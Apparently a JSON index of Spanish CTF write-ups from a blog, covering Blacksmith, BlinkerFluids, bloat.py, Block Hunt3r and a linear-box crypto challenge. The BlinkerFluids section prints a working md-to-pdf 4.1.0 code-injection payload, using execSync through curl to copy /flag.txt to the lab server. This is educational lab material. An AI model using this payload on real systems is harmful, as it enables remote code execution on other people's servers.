solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/","section":"ctf","summary":"Binario de 64 bits. Reglas seccomp. Shellcode open-read-write","time":6,"title":"Blacksmith"},{"contents":"Tenemos una página web donde podemos escribir en Markdown y transformar el documento a PDF:\nPor defecto, tenemos este contenido en Markdown:\nComo tenemos un proyecto en Node.js, si leemos el archivo package.json veremos las versiones de las dependencias de terceros:\n{ \"name\": \"blinker-fluids\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"start\": \"node index.js\" }, \"keywords\": [], \"author\": \"rayhan0x01\", \"license\": \"ISC\", \"dependencies\": { \"express\": \"4.17.3\", \"md-to-pdf\": \"4.1.0\", \"nunjucks\": \"3.2.3\", \"sqlite-async\": \"1.1.3\", \"uuid\": \"8.3.2\" }, \"devDependencies\": { \"nodemon\": \"^1.19.1\" } }  Al buscar por md-to-pdf versión 4.1.0 se ve que tiene una vulnerabilidad crítica (snyk.io). Solamente tenemos que usar este payload:\n--js\\n((require(\"child_process\")).execSync(\"id  /tmp/RCE.txt\"))\\n---RCE  Lo podemos usar para copiar el archivo flag.txt en el directorio static/images:\nY ahora lo transformamos a PDF:\nSin embargo, no funciona, por lo que podemos borrar el archivo. Vamos a probar con curl:\n$ curl 206.189.25.173:31956/api/invoice/add -d '{\"markdown_content\":\"---js\\n((require(\\\"child_process\\\")).execSync(\\\"cat /flag.txt \u0026gt; /app/static/images/flag.txt\\\"))\\n---RCE\"}' -H 'Content-Type: application/json' {\"message\":\"Invoice saved successfully!\"} $ curl 206.189.25.173:31956/api/invoice/list -s | jq [ { \"id\": 7, \"invoice_id\": \"5b364083-a15a-41d6-a9b3-6f8e20af96aa\", \"created\": \"2022-06-30 14:50:39\" }, { \"id\": 1, \"invoice_id\": \"f0daa85f-b9de-4b78-beff-2f86e242d6ac\", \"created\": \"2022-06-30 13:07:16\" } ]  Y ha funcionado:\n$ curl 206.189.25.173:31956/static/images/flag.txt HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/blinkerfluids/","section":"ctf","summary":"Node.js. Dependencias de terceros. Inyección de código. RCE","time":0,"title":"BlinkerFluids"},{"contents":"Se nos proporciona un script de Python llamado bloat.flag.py:\nimport sys a = \"!\\\"#$%\u0026amp;'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+ \\ \"[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ \" def arg133(arg432): if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]: return True else: print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\\ a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\\ a[81]+a[68]+a[66]+a[83]) sys.exit(0) return·False def arg111(arg444): return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\\ a[75]+a[72]+a[78]+a[77]) def arg232(): return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\\ a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\\ a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\\ a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94]) def arg132(): return open('flag.txt.enc', 'rb').read() def arg112(): print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\\ a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\\ a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25]) def arg122(arg432, arg423): arg433 = arg423 i = 0 while len(arg433) \u0026lt; len(arg432): arg433 = arg433 + arg423[i] i = (i + 1) % len(arg423) return \"\".join([chr(ord(arg422) ^ ord(arg442)) for (arg422,arg442) in zip(arg432,arg433)]) arg444 = arg132() arg432 = arg232() arg133(arg432) arg112() arg423 = arg111(arg444) print(arg423) sys.exit(0)  La clave aquí es que la variable a contiene caracteres imprimibles como una string, y hay varias expresiones que cogen los índices de a. Para leerlas, podemos utilizar una sesión interactiva de Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; a = \"!\\\"#$%\u0026'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+ \\ ... \"[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ \" \u0026gt;\u0026gt;\u0026gt; a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68] 'happychance' \u0026gt;\u0026gt;\u0026gt; a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\\ ... a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\\ ... a[81]+a[68]+a[66]+a[83] 'That password is incorrect' \u0026gt;\u0026gt;\u0026gt; a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\\ ... a[75]+a[72]+a[78]+a[77] 'rapscallion' \u0026gt;\u0026gt;\u0026gt; a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\\ ... a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\\ ... a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\\ ... a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94] 'Please enter correct password for flag: ' \u0026gt;\u0026gt;\u0026gt; a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\\ ... a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\\ ... a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25] 'Welcome back... your flag, user:'  Vemos que happychance es la clave para entrar en la función que descifra (y rapscallion es la clave de cifrado). Ahora podemos simplemente poner happychance para ver la flag:\n$ python3 bloat.flag.py Please enter correct password for flag: happychance Welcome back... your flag, user: picoCTF{d30bfu5c4710n_f7w_b8062eec}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/picoctf/reverse-engineering/bloat.py/","section":"ctf","summary":"picoCTF 2022. 200 puntos. Desofuscación de un script de Python","time":1,"title":"bloat.py"},{"contents":"Tenemos información de que alguien ha subido imágenes a la red de pruebas Görli (una Blockchain de Ethereum) entre 2020-07-30 y 2020-08-01. Necesitamos encontrar una imagen que contenga la flag.\nPara interactuar con Görli necesitamos ir a https://goerli.etherscan.io. Podemos encontrar el rango de números de bloque entre las fechas indicadas manualmente yendo a https://goerli.etherscan.io/blocks/\u0026lt;número\u0026gt;. Probando y probando, llegamos a que https://goerli.etherscan.io/block/3134050 es el primer bloque en el rango y https://goerli.etherscan.io/block/3151326 es el último (un total de 17276 bloques).\nBásicamente, un bloque contiene transacciones de una dirección a otra. Estos bloques son encadenados en una Blockchain por un cierto minero. Una vez que un bloque forma parte de una Blockchain, ya no se puede eliminar ni modificar.\nPor tanto, tenemos que encontrar transacciones contenidas en bloques que contengan una imagen como datos de entrada. Sabemos que las imágenes PNG empiezan por 0x89504e47 (bytes mágicos) en hexadecimal.\nPara consultar todos los bloques y sus transacciones, vamos a usar la librería web3 en Python:\n$ pip3 install web3  Luego, podemos interactuar con algunos dominios RPC para Görli. Usé el siguiente script en Python para consultar cada bloque en el rango y buscar si alguna transacción tiene datos que coinciden con los bytes mágicos de una imagen PNG:\n#!/usr/bin/env python3 import sys import time from requests.exceptions import ConnectionError, HTTPError from web3 import Web3 from web3.middleware import geth_poa_middleware w3 = Web3(Web3.HTTPProvider(sys.argv[1])) w3.middleware_onion.inject(geth_poa_middleware, layer=0) start = 3134050 end = 3151326 for n in range(start, end + 1): sys.stdout.write(f'Trying {n}. Progress: {100 * (n - start) / (end - start):2f}%\\r') try: block = dict(w3.eth.getBlock(n, True)) except (ConnectionError, HTTPError): print(f'Trying {n}. Progress: {100 * (n - start) / (end - start):2f}%') print('ERROR: Waiting for 10 seconds...') time.sleep(10) continue for transaction in map(dict, block['transactions']): if '89504e47' in transaction['input']: print('\\n\\nBlock Number:', n) print('From:', transaction['from']) exit()  Si ejecutamos el script, después de algunas horas tendremos el bloque coincidente y la dirección del emisor de la transacción:\n$ python3 find_tx.py https://rpc.goerli.mudit.blog Trying 3134136. Progress: 0.497800% ERROR: Waiting for 10 seconds... Trying 3135687. Progress: 9.475573% ERROR: Waiting for 10 seconds... ... Trying 3142336. Progress: 47.962491% ERROR: Waiting for 10 seconds... Trying 3142346. Progress: 48.020375% Block Number: 3142346 From: 0xb7e53a55da3eea0fbd09566afda143667d77527d  Vemos que el número del bloque es 3142346. Ahora podemos inspeccionar este bloque en https://goerli.etherscan.io/block/3142346:\nEste contiene dos transacciones:\nUna de ellas contiene la imagen en formato hexadecimal:\nPero esta no es la imagen completa (podemos probarlo, pero no se muestra nada). Por tanto, necesitamos consultar las transacciones realizadas desde la dirección 0xb7e53a55da3eea0fbd09566afda143667d77527d:\nY aquí tenemos otra transacción originante de esta dirección. Esta debe tener la otra parte de la imagen:\nNótese que los dos datos de entrada en hexadecimal comienzan por 0x0. Tenemos que eliminarlo para recuperar la imagen PNG correctamente.\n$ hex1=89504e470d0a1a0a0000000d494844520000001a00000213080600000019da0c2f0000183649444154789ced9d797c54d5d9c7efcd64df2793c9cc3df7ce9dc990909085cd4230614d30a834285b580a4211811ac3123581b204042b220101432029904c66fa795bb5da165fdb2a6f6dabd6da2a6dadb8b41f9757e962ad5b4520dbeffde3cc649b25f79eb9f145bd7ffc3e30e766e69bc93de7b9e7799e739ec371e255f85ce4fb4f7d7dfdb04807e9201da4831480e0e1fcd51ea95e833e839714801a2709aac50412338d014508012124e0b51e3703e8bfdb024b1429e8b156ff6b4cdf28987cdf48c9cf7e45415d0d4901e50305bac6042a974840f94081ae3181722a62558b09745995785cf6f07e9fa1cc04a9d02fe759f0cb7996e1074984400ad013350705ebf25716e82fabd3152b2c902c0a8a1516e8b62dbc627d31eed1150a124088ffa35c73d0c22a031656195841bc62757bc504fadd920cd56202d908a1122d0315a8dddbc604f2f5a46fdfc50f50a0f6b07a5db037076a0f0b244ad4b4c0ddef26bbfbfdf6be766f9b6863ecde59d9161042f06953df9cfa93c6280a12093e3a1c4ddb1e8806210439b98c9d6156692a082178729509704501edd1f8e1a274480e0b46e49ad13cd382cbdb53e1ba8efe420b2afc67418a4047b71b204a168c9508f68e23d85548304a14b0a0320eb7de120d9b6841a148601305c8b946fcfc30e338bae4e1704b8d01f6f149909c46c80529285d168d37da38fcdbcde1f6ed3cca564461c1b70cf85153608ba1d804757b38bcece2f0d3360ecfb5d3194fffeb9dde9f09f67ecd6d9de6a0eee3f1e83e1e3fcc20378fa532c1529900ee61047d7020ae77b0fea7313a7c50774b1c3aee4ac1c53a232ed4a6e1d33bd3f0bfebd251375e80e4b040b25b70789a151fd5a4e1426d1a3eab33e2f28e547437c503831e154141ef6c4bc29a2c82ab448211a2804cd18a4cd10abb688528a763f9cdd158b02c069264eebde614058c1609966712bc5997ac0c7473111de557cf8943d5161e1bb6f1d8b88d475d3d8fe6231c3e767378cfcde1fe063a8e366ce3b17e2b8f69f3634108c18a891665a07c3bbd076f9cf01fe5a1f4f6096a58f3ed4419c85e900cb920193d2ac74b8f87835c900c7ba1c23fddf3ed542c8333d07baf30cba0412c4811488b58902290e4340694cf3a04bac6040a160bf281025d63bb4741a42672f2150575362405940f14e81a13488b589022506e45ac6a3181d4c582fc67484c9da1eb4802ba9a12007784aa8ea31a74a38da05226786a7e06ba5bfcff449a817c1da0a822169b0a2c78afce08b8fd7d56cd40efbb39dcb12d0213c7a4e0e16b2de86a0c3dc76306c1439fa6bf3ac1a17471346eca31e3cd2a13e0f27f44a800f579dd7da0beb64f3d3cf6dec3636c51128e4fb6e2f2fe4436507f6fdb070ae4899f5a9881fc2c01b3ed8c03d626597ae503f56feb2f49b280488ca1ce1dbbf95ef940fddb0229ecce10ec09aa79f7fe791bd5b08382f5ca9e5331c305e2d1d3168d8bbb52f08b7916dc9e1bfa01a81ee48a42c7de643cbf38033b0a0826480264bb095933b4b00ced91e83c908497579a71ef7882293601b29c0ee794042cbacd80f6260eff18c2f353047aa048c02c8940b6a523b32411f3d71970e2010eefba437be2aa412221c8760a3858958ab74ec6040cfc69021a3b271672b611e3242b6a73097e35df828bbb52d0d31683c12e6458a04f3d1c1e3fc1e1d6cd1118756d1c64671a264802b6e6133c5b69c1e53d29802bb4d3acbad77de8e6f0503387159b22905d1a0fd96ec2d592809d855a776faf7a3c1cfee9e6d07694c3826f199059e2ff68d004d45fdd1e0e6f69d1bdb590ca27ec101fe88aa262053d31c78a27e65887043596a563df78820b01c2368a07aca8c06b58bb38018410fc786d0a1ba87742e2fbd304d1e93d346ab2ba88f151ee03dd332eb4768ca13f37420c33c02e7ba3294a1416c8171151a2f0eed1708fa3d17363307a6ee8398126a00eaf861da48514812e6f4f55a4b04105a21044c42bfa3a6cd0ba3ade4f37dfc1a3647134ec59e958362f156b3787f669c3ba471d1e0e3b3647e26a89e0b51a7ffba66967f8b08d7a18f30b435bf7b0411f34c453fb66d700f4af0d263fbdb7de84575699715b21b51ad3cbfce33faa410ec91250b22d03923d0df9e571f8c5310dc651208fae7e0f8fbdf772f8410b9d0d0df527beb22cc300b90d407b34958288c9d0a041f1ebeee6589c5b6946738980fa0282fa0282e61201e7569ad1dd3c744c2820e8e386381c9a28c07523b55f970ec5a1a68040160924671aec1313619f9808c999065924a82920b874284e3d68ff6cbaece6e09d74dab4bb3403222198589e80078f7378ad9deac1e31c8a66254024047bcafcb3c94382a6e6d0dcf8dbdfa593c6d176fafab78dfe93c8e71aa965189bc9605433ed561a946da58632272f7dc0ebfeea6835d0fc785eba7a5071094d07bc74670ae0e171fba62888b60c9cad360e8c3cba23f062b511a294819a8d81a7c2214147ea0d10e50c943b089ebcc18a3faf4ec7daebcc2891091e2a17f0ca2a335e5965c643e5565c6d23f866b919e7d6307ca34e0f87fa5d3c464c4980cd9106594a872c99217a257bd5ffb55d32b38da31e0f8777dc1c1e39c1a1e9304d1a0e256d2d03a3ae2c508f2b56b598409bb2886a3181ec5f4b0a28df9c3c501b13e895f6c0f27d68a0364d3b83e60b90be4220290344ca187ed0cebb79ecbc7be033ca519c08473163ca408dde72078e0b5d5926081e0e701bd0d598808edd29c3e788751e89c5892902e6cb0413250185411cb3b041f553e92c28737c0a165619b06eb3bf63b6ae2e74f44b112857a6b3a0c70ef18ac3cf4ca0fc31263a0b6a539712550ddab53912a26cc69f6f4f85d2f03313e8ef1b4ca89d67c22ca78033732df85b95bf63f6af0da6f0413ec74bf4a6d6ec411cb3b04143a5d982a5dbd8066c985206721bd48b0574bc58502d26902d27754849238d101d96f09e474fb942a8cd8033fb92b077be05e39c0224bb09f9b3fcbd3fe6ced0d31a830f371be19a2e60966c85233f05335744e1e4031c3e08fb79e48e40d703097879a5195b0b0414d8ccc89e9a8075b51178ba957a21e1f53a57142eec4cc1a3d75ab1c02ec0916dc4a4ca181cd84ff37c4a16fb2902dd3b9e60824420e75a50b93c193fde9f804f1b13d015424c205f4f1a2311ccb511cc572026902f1cad464ca00e0669d6bdd5ea2b0b8ae82725ed8ca01fcc147aa5a49d19e41b47c15c1425291f45a0d2e551bd52d2ce0ceaec2725ed5f845ea7837450af7413c408d24dd09709c4036e037a5c8cd32dff0f8b005cd1e83911878efb9270a1ce88d76f36e3c93956349708a80bb07a5011a8eb70222ed7a7e27c9509cf545ae02915b07bb480557601a5360123250b64c90c9b3d0d725e0aec9318c368153682312281c36e857d5c2a32672460f48d31285f19859b364560f34e1e870f7078f8048767db39bcc9ba14c431390192d388fc4c0b6e2f11f0c43732f0d1d654743425a0c7150525410e45a0f36e0e3f3ec161db5d3cae5d15899133e251989d8a4a7b06f68e13f0f38aa15741a9ee0c5d1e1eefb9a2f1f8fe44d4cc3721d32e400ab0eb9a09d4e38a41674312fe516dc2e31556ec2ab4e2ebf674e4e4a720e7da38cc591b788db76ad0965104d7480423b2ac9850918a9b6b6271f460247ed3cee3138fb2d09a22902d3b15a22d1df9360b6eb20bd85e20a0b958c04fae13f0fba519385f65c2c5ad4674ec4b42f7b178f6017ba68dc3771fe0f0ed5d3c965447a07851349c65f1b08f4b86dd9106bb6446ae68c5749b802532414db60671ef1e0fb5d61fba39fcc1c5e14727391c68e050bd85c7d76f8944e10d31704c66f46195aacb437781bcc31e67d09726ea4b130781f4a589aa415fc1a589212c82a6a07de309f68d1fa615ec6a3b8b72507b143aef4f44c73dc9e8b87ba07ca0fe6d4ca0ffec8bc777c611cc96084a2401570f920fd4bf8d0974e7649ae32b2c4dc092ea082cdb30503e50ff362650a1837ed09f9a79f478383ff940fddb984092d8f741c3da1944d904510e9e5a1beaba6290ab892ad8870c755db371a444ca40fa4e797da7fc9717a4ef94ff62ed9467d5150ef2adf71e6ed0eed104bb47ab9b8b33815826fd3a08f07070ce8c8773a6f20a55cca08fbd1a76108bb $ hex2=e6020dd110b09d21d311690ee883183be848ed8e70552ba4d35d46a694520a5db5443ad96560452ba4d35d46ae9b0ee91be4d754890be4d7558ee9152a97894078ef1680afaf4480c1a2709689b9d16f2c3fe5993827f549b8056c665d89e6534eeb3796de87daf2b1626c041089eddc8e8fe2ff81aadb7f5db8681bfe98bcb32f0e2b2be6d41a7f7d0a2c8eba73216401eeba4339d0f5a07b6cb8440eef7087fa7855a897101b6ac2a02c9de6dab1d27fabe51e709435fe4e4146def6ca533227b002ba10834e12aba13e4a52d7d7ffb3fd62541140588928073df4e023c3c5edb4ec3364545fe9d4611e8f65b6241448265a308feb5310def6f4ac3925c82af95a460d29414548e24387383154b72098828604735637af4ed360e634be3218a16384501234401b65c23be771f8f870ef0b08f4e8624992139d250ba3806efb3a6dee0e1f0868bc39d3b78cc5913896fac8fc08f9afa268acfb771387c80c3f78f73f8248839526d82ba3dca56ac870d62d5570cf4c96623ba8fc57bad76a0a5061a2d4d1c259bb1cc4ed03449c053f3ac7ea79768b634f1e07e1e05e571106d19014f2fd17469e23fdd1c76eee131666e0cf2e70c7c4c68be34111e3a590c54775d5f9a780582342fd63148ddc7e2f0d28a81c53a8e170bf8d34d19e83ec658ac63b03e3b1887aa5c0259140214eb10509d4770f17e86621d83b5cb5baca364763c1e6de1f07a3bd5232d1c8aafa3c53a769731d667e8af310e3a0b3adbe4bfacea85a6308a750c5676aeaf5887ffcdbf7c328c621d8355b3310aa29481df57f917eb78be8a16ebb8a3468308e4b935e95831d38c4912c183d7f415eb78b05c409144b062262dd6f1e6da81520db20728ce11a858c760a9062929d43154f18e2bd8047938d015d25ec7cced7bcc6b057247a0631f2d75fa70b98063c5020e4da0fffeb09cd60dead89f14b478b532509b013fbdc18252899a21d1960e29d30869442aa44c23445b3a6451409944f0c4dc0ca08dd1e3fbd90a236491c0969b8625d506341de670ba95c3936d3c4eb7f2683acc6149b501b61c5aa8e889958cd9ffebf2a87f746c8f61c072dedfad30e3859574bc747b3834eda156e2fa0246ff28d3bb25ffb3413be5f3332d2870f64dc12e781d31a7cce8f18d1e471db1d7eb5206f4b075350654ddeebb1f3c5edd9c42377f8ef30fe42a02d55647838856943b089e5b94814bdb53d1d990848ec389b8dc90844bdb53f1dca20c5ce32020a2155baafded9e22d0876e0ef36e89822d2b0d36d18ad122c12c89608e8dfe3b5a24b08956d8b28c58b02e121f87b395b8c3c3e191660e6b6a23306d5914f22a6291755d2cf22a62316d5914d6d646e0d1e6e0733c26cbd0e9199880ff824e20f5621d2c20bd580733482fd611de800d535716e8d2b65426a9068d1205af8857c15e0f946a50d51603e6979b20659a31797134d6d4f25853cb63f2e268489966ccbfc684aa2d06bfe34155839e5e95867c9160475de480a0c6650f87ed9b239127123cb32a74945f11687a36b5751fb6f977e10fbc19b1d2911a58ef4c272d94f2c961ff9d061f1fa2db4c9c4e0d06ececd989208460df142b3af627a1a72d163d6db1e8d89f84bd257472397bb606c5de9f3ec6216b42122451c04c1bc17a2755998d401205644d48c2335a64c4e0e170b695c3376b22905f110bc7d40438a62420af22162b6b2270b635344415081e1a86bee8a12731fcdd4dffaf34343d4c26c83ffe3a2ca040a7470f0b2850fc551dc81545bb766b5c48050ae82a03b90c7875753a1aae22a87612ac91438b19747a91094e91401a6942eeec58a67a348a40c523a8ad6bb92f029f79d8ead12802f9d60529f11ac21a47a2cd04d1167a3aa509e86423d5b083b49072909e946701e949793d29df2b3d29af098855573848dfa0a1837cd237685ce1a0e14ecac3158977aa4d689d4acf75db5948e09a26e0fc7a93a2699832509b01274badc81605d8c7f6ed93b0651b315224682bb506cc82a906fde29654d84482b2390938dbaf72fce9ef72183f23093691e0cc2a0d02ec8bafa29193a7bcd3adfe03f6f1fd7442327fac066b8973bd4775fcc7c5f9812eb8e8146b64802c986a50d648fa8d2e36fb7fa34f9be8a4313b87e1f091c19a39854e89cfed8e1b00ea698bc1430bcc2084a0729e7fa11bd5a07b37458310014df3d306806a7308468a02461625e185160dbaf7f9560ecb364460cb9d3465e0284e84634a0272af8fc5f28d06fc41cb5850ffcd316fb969e5aa0b9ee18c05e9eb82d480f47541cc207d5d90be2e28b0f473c44281f473c4984d907e8e987e8e5868901e8e6601e9e1683d1cdd2b3d1cad094877c4548174478c19a43b62ba23a683b400e927683082f4133474900ed202a49b2046906e8274d020853adc22c2eb9405df76a2ac333447e17fe65af1cc727fb7fe93bb92f1e82c0127a70878a6d282ae2381fd2445a0c7d7a5402204b72d1fb8fce3df7be331432690ec26484e236ca280d5b904971b198f5359554c634167ee191846db39d38cccbc74b43572387d92c3d4d9d4293b7a83ffe25945a0a291d4117bb7a5ef1ef4b44560ac9d60c3f2be8cf2d3f7d3104d692e6388c6ee2dc1d8d9de077a7b5f0c4442f0c3ed7d51928bde047d26eb36d5bc7c9a0fffdbbebe1bfde8ba148892156ff4fb96ef1fa661b4b163fcbd3f45a0a573e9068dbd53ade83a9c888e7d4958942fa064fac00a6fbfaea141a79b16301e1d75e6080f39d708891054d8084a6d0492d384efdf37f039f4adf224c805c9f8590363c14978383cdcc8e19a95511855118b294ba3d172d03f54f3a2f73c902ed671e493efec1c7f6bcd0fb9de8ecdd6b90de8698d45c7de64bc7bab09a7afb76267a116654edb23d1dd1c8f4b3b52f1d20a335cd305accf22986a1360b7a543ce4b41d64c0d42348726085866271863cb803dcb08c7e404942c89c6da5aba79fdd9760e1f0d515a4e11481a61842859b1ac3403a7b7a7e0fcc9587406d9e31f16e8b1931ceed8cea3b8321a578f4bc6fa5c331ebc46c0f92ae51b025475860eb701678fc5e1ee554664675a87dc5fa91ad4d9908437d7a6a37dba15abb24d183b291165cba350bf47f9965545a06b24028748b0a0cc84937725e28dd698e1b947795f8f855c988c6c5b3a66db046cce15f05f65025e5e61c6c56da9e86e4a005c1a0cd80b1e0e2fb473683ec2614d2d8f8995d1b01725c26e4f43816441a52c60cf98612880dce9e1f0d7760e0fb670a8abe751be320ace19a15779324eb70616ebe8f2f0784f8b010b0fa717eb6003e9c53af4621d03f4252bd6e136a8170be8d45441b59840a29ce6275f2023583b13e8fb2dfef27d60b0764d3a033cc13f901002c27ac2e0605d688cee0575f55b2bd4e9cd8ec9ac49f9feea6e8945539905a23d03442478751b4dc8c3c3e3ec1dd4044d9cc06882e0e180b6289cdf90869a3c6a0556ae8e46568109f3b3089eadb4e0e905165cefa47fb6da758c5ef9fb9b8dd83b5e40ae28402e4cc19a3b0cf8c0cde1be9d11b06553b7df260a209219932a62f177d6a4fc1891c036d2881bd746e2d9535cef33a9dbc3e191e31c6edb42eb35dcdfc0059d3b28024d5e148d478f05f6e4944af1bcaef7b59e945703d293f2cc203d29af27e5ff1f40ae085caa33e2d2b6c147d9f0e86a4cc0a5ad4674ec490979629022d01feb12e114092ae70c8c2cbebed18845990272442b8a248223570be86e09e3e4e8da9974c0fea45f38faf2b1284c7608285b1c8d0d5b79144e4b844808dc958117640607f53b3a72469e15a228e0fd937d6d8fdd9a82fcb1667ceca2af7fd31805221294e70901979a060535969870a4d884c3c526d845025922682c31f56a61ae1593b3337a5f3f5062822412d8c5be9f53046a6be2d0dac4e1d4510e0e6fbda093870cbda7ce148db1e0969be37a5f1fdf17094208b272cc387594be5ff53d2a2fa5d3a8dfac4b03daa3f1c1ddc9c8b259f1f4fd7d76efb7b53464bdb022f0491a8a40aeef4440b49b315ea24fd6ebec02ca2ae207cc216aca9261cb4ac5437bc38833747b38ecd9c32367561c1c531250be320aaf0d3a24f3d72e0e675c1a39621fb939bceb56e67885050a47ba09ea6dd34d906e827413c4060a474141ddc7e3d17d5c5d698450ef0d0a5a2a132c95d5157b808703dc81df1b14e41b3b9f1d5357fde3e2319a5dce742a2cc236631a1d3b0dc502ce7dd38cbfac4ec75f57a7e3ed75e9f86c7b2a3531ad51f864b3116fac49c75f56a7e3b59bcd383a8d86aea74f515870f27bf7f170142542924dbdde03f51a2c1823123c3cd70cd7f519c81105c8b68cdeeb92cd04fbb8649c1a349e42f6ba57db39788e733872907a07071b386cbd8bc7b8b244144804a36c04a5f362b1771fbd7ee800355b7f74f9679d99baf7ef8ef2bdd1add75b94a5df98405d1e0e724132e48264c5c5769907ecf3de047cd803566bf981eaebeb87453a4807e9201da40034ecfabc40ff075e830bf30ac0a4180000000049454e44ae426082 $ echo \"$hex1$hex2\" | xxd -r -p \u0026gt; flag.png  Y aquí tenemos la imagen con la flag:\n","image":"/images/osint.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/osint/block-hunt3r/","section":"ctf","summary":"Red de pruebas Ethereum Görli (Blockchain)","time":2,"title":"Block Hunt3r"},{"contents":"Se nos proporciona el siguiente código en Python que cifra la flag:\nfromCrypto.Util.numberimportbytes_to_long flag=open(\"flag.txt\", \"rb\").read().strip() TABLE=[ lambdaa, b: f\"({a}+{b})\", lambdaa, b: f\"({a}-{b})\", lambdaa, b: f\"({a}*{b})\", ] defbuild_box(s: bytes): e=\"(x)\" forbins: e=TABLE[b%len(TABLE)](e, b) returneval(f\"lambda x: {e}\") box=build_box(flag) ct=box(bytes_to_long(flag)) print(ct) print(box(1337)) print(box(0x1337)) \"\"\" Output: 5545457088879574964209613711409478327714366805681091501255101702161458272094830554232779120250 3011454617406654839679120250 10002638090931457241529120250 \"\"\"  Se trata de una forma extraña de cifrar un mensaje. Básicamente, box es un conjunto de operaciones que contiene una sola x, y al llamar a box con un valor dado, se sustituye dicho valor en la x para obtener el resultado final.\nPodemos ver cómo funciona box:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; TABLE = [ ... lambda a, b: f\"({a}+{b})\", ... lambda a, b: f\"({a}-{b})\", ... lambda a, b: f\"({a}*{b})\", ... ] \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; def build_box(s: bytes): ... e = \"(x)\" ... for b in s: ... e = TABLE[b % len(TABLE)](e, b) ... return f\"lambda x: {e}\" ... \u0026gt;\u0026gt;\u0026gt; box = build_box(b'ictf{fake_flag}') \u0026gt;\u0026gt;\u0026gt; box 'lambda x: ((((((((((((((((x)+105)+99)*116)+102)+123)+102)-97)*107)*101)*95)+102)+108)-97)-103)*125)'  Como todas las operaciones son sumas y multiplicaciones, podemos expresar box como una función lineal $\\mathtt{box}{(x)} = mx + n$ para ciertos valores $m, n \\in \\mathbb{Z}$.\nNos dan $\\mathtt{box}{(\\mathtt{flag})}$, $\\mathtt{box}{(1337)}$ y $\\mathtt{box}{(0\\text{x}1337)}$. Estos valores son suficientes para hallar $m$ y $n$ mediante un sistema de ecuaciones lineales:\n$$ \\begin{cases} \\mathtt{box}{(1337)} = 1337 \\cdot m + n \\newline \\mathtt{box}{(0\\text{x}1337)} = 0\\text{x}1337 \\cdot m + n \\newline \\end{cases} $$\nPor tanto,\n$$ m = \\frac{\\mathtt{box}{(0\\text{x}1337)} - \\mathtt{box}{(1337)}}{0\\text{x}1337 - 1337} \\qquad n = \\mathtt{box}{(1337)} - 1337 \\cdot m $$\nUna vez que tenemos $m$ y $n$, podemos encontrar la flag:\n$$ \\mathtt{box}{(\\mathtt{flag})} = m \\cdot \\mathtt{flag} + n \\iff \\mathtt{flag} = \\frac{\\mathtt{box}{(\\mathtt{flag})} - n}{m} $$\nAhora vamos a realizar las operaciones con Python:\n\u0026gt;\u0026gt;\u0026gt; c = 5545457088879574964209613711409478327714366805681091501255101702161458272094830554232779120250 \u0026gt;\u0026gt;\u0026gt; c1 = 3011454617406654839679120250 \u0026gt;\u0026gt;\u0026gt; c2 = 10002638090931457241529120250 \u0026gt;\u0026gt;\u0026gt; m = (c2 - c1) // (0x1337 - 1337) \u0026gt;\u0026gt;\u0026gt; n = c1 - 1337 * m \u0026gt;\u0026gt;\u0026gt; x = (c - n) // m \u0026gt;\u0026gt;\u0026gt; hex(x) '0x696374667b776f775f737563685f6c696e6561725f736f5f656173797d' \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(x)[2:]) b'ictf{wow_such_linear_so_easy}'  